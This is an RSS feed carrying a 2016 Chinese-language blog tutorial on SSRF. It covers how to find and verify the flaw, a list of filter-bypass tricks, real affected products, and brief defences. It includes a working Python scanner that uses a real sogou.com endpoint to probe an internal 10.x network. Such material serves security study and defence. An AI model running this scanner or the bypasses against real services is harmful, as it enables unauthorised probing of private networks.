<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ssrf on </title>
    <link>http://wyb0.com/tags/ssrf/</link>
    <description>Recent content in Ssrf on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Thu, 30 Jun 2016 15:30:54 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/ssrf/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SSRF</title>
      <link>http://wyb0.com/posts/SSRF/</link>
      <pubDate>Thu, 30 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SSRF/</guid>
      <description>

&lt;h3 id=&#34;0x00-什么是ssrf:fc51d19c5562745d631f5060bfb65579&#34;&gt;0x00 什么是SSRF&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，&lt;font color=&#34;FF0000&#34;&gt;它将一个可以发起网络请求的服务当作跳板来攻击其他服务&lt;/font&gt;，SSRF的攻击目标一般是&lt;font color=&#34;FF0000&#34;&gt;内网&lt;/font&gt;。&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-ssrf的危害:fc51d19c5562745d631f5060bfb65579&#34;&gt;0x01 SSRF的危害&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;可以扫描内部网络&lt;br /&gt;
可以构造数据攻击内部主机&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-漏洞挖掘:fc51d19c5562745d631f5060bfb65579&#34;&gt;0x02 漏洞挖掘&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;其实只要能对外发起网络请求就有可能存在SSRF漏洞。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1. 从WEB功能上寻找
    通过URL分享内容
    文件处理、编码处理、转码等服务
    在线翻译
    通过URL地址加载与下载图片
    图片、文章的收藏
    设置邮件接收服务器
2. 从URL关键字寻找
    share、wap、url、link、src、source、target、u、3g、
    display、sourceURl、imageURL、domain...
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-漏洞验证:fc51d19c5562745d631f5060bfb65579&#34;&gt;0x03 漏洞验证&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png
1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png，
    说明不存在SSRF漏洞。  
2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png
    这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-绕过过滤:fc51d19c5562745d631f5060bfb65579&#34;&gt;0x04 绕过过滤&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;有时漏洞利用时会遇到IP限制，可用如下方法绕过：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;* 使用@：http://A.com@10.10.10.10 = 10.10.10.10
* IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
* 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
* 端口绕过：ip后面加一个端口
* xip.io：10.0.0.1.xip.io = 10.0.0.1
        www.10.0.0.1.xip.io = 10.0.0.1
        mysite.10.0.0.1.xip.io = 10.0.0.1
        foo.bar.10.0.0.1.xip.io = 10.0.0.1
* 通过js跳转
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x05-通用的ssrf实例:fc51d19c5562745d631f5060bfb65579&#34;&gt;0x05 通用的SSRF实例&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;weblogin配置不当，天生ssrf漏洞&lt;/li&gt;
&lt;li&gt;discuz x2.5/x3.0/x3.1/x3.2 ssrf漏洞&lt;/li&gt;
&lt;li&gt;CVE-2016-&lt;sup&gt;1897&lt;/sup&gt;&amp;frasl;&lt;sub&gt;8&lt;/sub&gt; - FFMpeg&lt;/li&gt;
&lt;li&gt;CVE-2016-3718 - ImageMagick&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x06-附实例poc:fc51d19c5562745d631f5060bfb65579&#34;&gt;0x06 附实例POC&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import requests
from IPy import IP
import Queue
import threading


def get_url_queue():
    url = &amp;quot;http://www.sogou.com/reventondc/external?key=&amp;amp;objid=&amp;amp;type=2&amp;amp;charset=utf-8&amp;amp;url=http://&amp;quot;
    urllist = Queue.Queue()
    ip_list = IP(&#39;10.146.20.0/24&#39;)
    port_list = [&#39;80&#39;,&#39;8000&#39;,&#39;8080&#39;]
    for ip_add in ip_list:
        ip_add = str(ip_add)
        for port in port_list:
            url_t = url + ip_add + &#39;:&#39; + port
            urllist.put(url_t)
    return urllist

def get_title(urllist):
    while not urllist.empty():
        url = urllist.get()
        html = requests.get(url).text
        patt = r&#39;&amp;lt;title&amp;gt;(.*?)&amp;lt;/title&amp;gt;&#39;
        m = re.search(patt,html)
        if m:
            title = m.group(1)
            print &amp;quot;%s\t%s&amp;quot; % (url,title)


urllist = get_url_queue()
print &amp;quot;start get title...&amp;quot;
for x in xrange(1,30):
    t = threading.Thread(target=get_title,args=(urllist,))
    t.start()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x07-防御:fc51d19c5562745d631f5060bfb65579&#34;&gt;0x07 防御&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;限制协议为http或https&lt;/li&gt;
&lt;li&gt;禁止30x转跳&lt;/li&gt;
&lt;li&gt;过滤参数(只要出现内网ip直接干掉)&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>